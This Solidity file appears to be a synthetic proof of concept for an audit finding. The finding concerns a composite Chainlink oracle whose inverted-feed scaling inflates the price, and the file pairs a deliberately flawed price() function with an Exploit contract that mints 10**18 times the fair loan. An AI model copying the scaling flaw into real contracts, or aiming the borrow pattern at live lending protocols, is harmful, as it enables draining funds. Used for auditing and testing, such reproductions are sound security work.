// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  NUTS Finance Tapio — ChainlinkCompositeOracleProvider.price()
    (MixBytes, finding 62663).
    SYNTHETIC, cheatcode-free. The inverted-feed fold is the operation the
    report states: the accumulator is multiplied by
    (10**assetDecimals) * (10**feed.decimals()) / feedPrice on every feed.
    Two inverted $2 feeds (8 decimals) therefore leave a 36-decimal
    accumulator that is 10**18 too large. Borrowing 1 unit of collateral
    mints 2.5e35 stable instead of the fair 2.5e17. */

interface IFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

contract MockFeed is IFeed {
    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {
        return (1, int256(2e8), 0, 1, 1);
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }
}

contract ChainlinkCompositeOracleProvider {
    struct FeedCfg {
        IFeed feed;
        bool isInverted;
    }

    uint256 public constant PRECISION = 1e36;
    uint8 public assetDecimals;
    uint8 public currentDecimals;
    FeedCfg[] public feeds;

    constructor(IFeed feed) {
        assetDecimals = 18;
        currentDecimals = 8;
        feeds.push(FeedCfg(feed, true));
        feeds.push(FeedCfg(feed, true));
    }

    function price() public view returns (uint256) {
        uint256 highPrecisionPrice = PRECISION;
        uint256 n = feeds.length;
        for (uint256 i = 0; i < n; i++) {
            FeedCfg memory cfg = feeds[i];
            (, int256 feedPrice,,,) = cfg.feed.latestRoundData();
            if (cfg.isInverted) {
                uint256 multiplier =
                    (10 ** uint256(assetDecimals)) * (10 ** uint256(cfg.feed.decimals())) / uint256(feedPrice);
                // @> VULN: both exponents are reapplied, so each inverted feed inflates the scale by 10**assetDecimals
                highPrecisionPrice = highPrecisionPrice * multiplier;
            } else {
                highPrecisionPrice = highPrecisionPrice * uint256(feedPrice) / (10 ** uint256(currentDecimals));
            }
        }
        return highPrecisionPrice / PRECISION;
    }
}

contract Stable {
    string public name = "USD";
    string public symbol = "USD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Lender {
    ChainlinkCompositeOracleProvider public oracle;
    Stable public stable;

    constructor(ChainlinkCompositeOracleProvider _oracle, Stable _stable) {
        oracle = _oracle;
        stable = _stable;
    }

    function borrow(uint256 collateralAmount) external returns (uint256 minted) {
        uint256 px = oracle.price();
        minted = collateralAmount * px / 1e18;
        stable.mint(msg.sender, minted);
    }
}

contract Exploit {
    uint256 public constant BUGGY_BORROW = 250000000000000000000000000000000000;
    uint256 public constant FAIR_BORROW = 250000000000000000;
    uint256 public constant FACTOR = 1000000000000000000;

    MockFeed public feed;
    ChainlinkCompositeOracleProvider public oracle;
    Stable public stable;
    Lender public lender;

    constructor() {
        feed = new MockFeed();
        oracle = new ChainlinkCompositeOracleProvider(IFeed(address(feed)));
        stable = new Stable();
        lender = new Lender(oracle, stable);
    }

    function fairPrice() public pure returns (uint256) {
        uint256 scaling = 1e36;
        uint256 hp = scaling;
        uint256 feedPrice = 2e8;
        uint256 feedDec = 8;
        for (uint256 i = 0; i < 2; i++) {
            uint256 rate = scaling * (10 ** feedDec) / feedPrice;
            hp = hp * rate / scaling;
        }
        return hp * 1e18 / scaling;
    }

    function run() external {
        uint256 collateral = 1e18;
        uint256 fair = fairPrice();
        uint256 got = lender.borrow(collateral);
        require(fair == FAIR_BORROW, "fair borrow");
        require(got == BUGGY_BORROW, "buggy borrow");
        require(got / fair == FACTOR, "not 1e18 times");
        require(stable.balanceOf(address(this)) == BUGGY_BORROW, "stable not minted");
    }
}
